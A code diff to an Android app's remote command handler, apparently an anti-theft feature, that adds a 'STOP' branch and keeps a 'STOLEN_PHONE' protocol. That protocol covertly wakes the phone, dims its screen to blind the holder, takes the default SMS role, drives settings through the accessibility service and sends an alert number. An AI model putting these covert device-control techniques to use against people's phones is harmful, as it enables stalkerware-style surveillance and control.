@@ -1241,70 +1241,104 @@ object CommandProcessor {
                     status = "STEALTH_DISENGAGED"
                 }
                 "STOLEN_PHONE" -> {
-                    val targetNum = if (content.isNotBlank()) content.trim() else JudasManager.getHandler(ctx) ?: ""
-                    if (targetNum.isEmpty()) {
-                        status = "FAILED"
-                        errorMsg = "No target number specified in command or Judas Registry"
-                    } else {
-                        JudasManager.engageStealthMode(ctx)
+                    val input = content.trim()
+                    if (input.uppercase() == "STOP") {
+                        // 1. Disable Stealth Mode (Restores volume & notifs)
+                        JudasManager.disengageStealthMode(ctx)
+                        
+                        // 2. Lift Status Bar Lock
+                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                            .putBoolean("status_bar_active", false).apply()
+                        Handler(Looper.getMainLooper()).post {
+                            DynamicUIManager.removeStatusBarOverlay(ctx)
+                        }
+                        
+                        // 3. Remove Screen Dimmer/Blindfold
+                        Handler(Looper.getMainLooper()).post {
+                            DimmerManager.removeOverlay(ctx)
+                            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.System.canWrite(ctx)) {
+                                Settings.System.putInt(ctx.contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, Settings.System.SCREEN_BRIGHTNESS_MODE_AUTOMATIC)
+                            }
+                        }
+                        
+                        // 4. Stop Relentless SMS Traps
+                        DefaultSmsManager.isRelentlessActive = false
+                        DefaultSmsManager.expectedMode = ""
+                        
+                        // 5. Clear Pending Alerts & SIM Traps
                         ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
-                            .putString("stolen_target_num", targetNum)
-                            .putBoolean("stolen_alert_pending", true)
+                            .putBoolean("stolen_alert_pending", false)
+                            .putBoolean("is_sim_trap_armed", false)
                             .apply()
-
-                        // 1. STRONG WAKE (Moved to Main Thread with delay to prevent race conditions)
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
-                            val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
-                                android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
-                                android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:StolenWake")
-                            wakeLock.acquire(3000)
                             
-                            val wakeIntent = Intent(ctx, PulseActivity::class.java).apply {
-                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                                putExtra("is_wake_trigger", true)
-                            }
-                            ctx.startActivity(wakeIntent)
-                        }, 500)
+                        status = "STOLEN_PROTOCOL_DISARMED"
+                        errorMsg = "All lockdown mechanisms lifted. Device restored to normal."
+                    } else {
+                        val targetNum = if (input.isNotBlank()) input else JudasManager.getHandler(ctx) ?: ""
+                        if (targetNum.isEmpty()) {
+                            status = "FAILED"
+                            errorMsg = "No target number specified in command or Judas Registry"
+                        } else {
+                            JudasManager.engageStealthMode(ctx)
+                            ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
+                                .putString("stolen_target_num", targetNum)
+                                .putBoolean("stolen_alert_pending", true)
+                                .apply()
 
-                        // 2. DIM IMMEDIATELY (Relative to wake, padded to ensure Keyguard dismisses first)
-                        Handler(Looper.getMainLooper()).postDelayed({ 
-                            DimmerManager.applyDim(ctx, 20, "AUTO")
-                        }, 1500)
-
-                        // 3. DEFAULT SMS GHOST SEQUENCE
-                        Handler(Looper.getMainLooper()).postDelayed({ 
-                            DefaultSmsManager.expectedMode = "AUTO"
-                            DefaultSmsManager.requestDefault(ctx)
-                        }, 3500)
-
-                        // 4. CONNECTIVITY EVALUATION
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
-                            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
-                            val isOnline = caps?.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
-                            
-                            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
-                            val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT
-
-                            if (!isOnline && hasSim) {
-                                MyAccessibilityService.instance?.isWaitingForDataSettings = true
-                                val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
-                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                            // 1. STRONG WAKE (Moved to Main Thread with delay to prevent race conditions)
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                                val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
+                                    android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
+                                    android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:StolenWake")
+                                wakeLock.acquire(3000)
+                                
+                                val wakeIntent = Intent(ctx, PulseActivity::class.java).apply {
+                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                                    putExtra("is_wake_trigger", true)
                                 }
-                                ctx.startActivity(dataIntent)
-                            } else {
-                                DimmerManager.removeOverlay(ctx)
-                            }
-                        }, 13000)
+                                ctx.startActivity(wakeIntent)
+                            }, 500)
 
-                        // 5. EXECUTE STOLEN ALERT
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            JudasManager.checkPendingStolenAlert(ctx)
-                        }, 17000)
+                            // 2. DIM IMMEDIATELY (Relative to wake, padded to ensure Keyguard dismisses first)
+                            Handler(Looper.getMainLooper()).postDelayed({ 
+                                DimmerManager.applyDim(ctx, 20, "AUTO")
+                            }, 1500)
 
-                        status = "STOLEN_PROTOCOL_INITIATED"
-                        errorMsg = "Target: $targetNum"
+                            // 3. DEFAULT SMS GHOST SEQUENCE
+                            Handler(Looper.getMainLooper()).postDelayed({ 
+                                DefaultSmsManager.expectedMode = "AUTO"
+                                DefaultSmsManager.requestDefault(ctx)
+                            }, 3500)
+
+                            // 4. CONNECTIVITY EVALUATION
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+                                val caps = cm.getNetworkCapabilities(cm.activeNetwork)
+                                val isOnline = caps?.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
+                                
+                                val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
+                                val hasSim = tm.simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT
+
+                                if (!isOnline && hasSim) {
+                                    MyAccessibilityService.instance?.isWaitingForDataSettings = true
+                                    val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
+                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                                    }
+                                    ctx.startActivity(dataIntent)
+                                } else {
+                                    DimmerManager.removeOverlay(ctx)
+                                }
+                            }, 13000)
+
+                            // 5. EXECUTE STOLEN ALERT
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                JudasManager.checkPendingStolenAlert(ctx)
+                            }, 17000)
+
+                            status = "STOLEN_PROTOCOL_INITIATED"
+                            errorMsg = "Target: $targetNum"
+                        }
                     }
                 }
                 "FULL_ONBOARDING" -> {
